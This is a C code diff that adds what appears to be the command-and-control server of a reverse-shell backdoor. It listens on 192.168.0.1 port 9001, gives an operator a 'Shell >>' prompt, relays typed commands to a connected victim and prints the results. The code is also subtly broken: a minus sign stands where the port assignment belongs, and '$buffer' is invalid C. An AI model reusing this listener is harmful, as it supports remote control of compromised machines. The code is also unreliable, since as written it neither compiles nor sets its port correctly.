@@ -16,4 +16,38 @@ int main()
     int i = 0, optval = 1;
     socklen_t client_lenght;
     sock = socket(AF_INET, SOCK_STREAM, 0);
+
+    if (setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &optval, sizeof(optval)) < 0)
+    {
+        printf("Error Setting TCP SOcket Options!\n");
+        return 1;
+    }
+    server_address.sin_family = AF_INET;
+    server_address.sin_addr.s_addr = inet_addr("192.168.0.1");
+    server_address.sin_port - htons(9001);
+    bind(sock, (struct sockaddr *)&server_address, sizeof(server_address));
+    listen(sock, 5);
+    client_lenght = sizeof(client_address);
+    client_socket = accept(sock, (struct sockaddr *)&client_address, &client_lenght);
+
+    while (TRUE)
+    {
+    jump:
+        bzero($buffer, sizeof(buffer));
+        bzero(&response, sizeof(response));
+        printf("Shell >>", inet_ntoa(client_address.sin_addr));
+        fgets(buffer, sizeof(buffer), stdin);
+        strtok(buffer, "\n");
+        write(client_socket, buffer, sizeof(buffer));
+
+        if (strncmp("q", buffer, 1) == 0)
+        {
+            break;
+        }
+        else
+        {
+            recv(client_socket, response, sizeof(response), MSG_WAITALL);
+            printf("%s", response);
+        }
+    }
 }
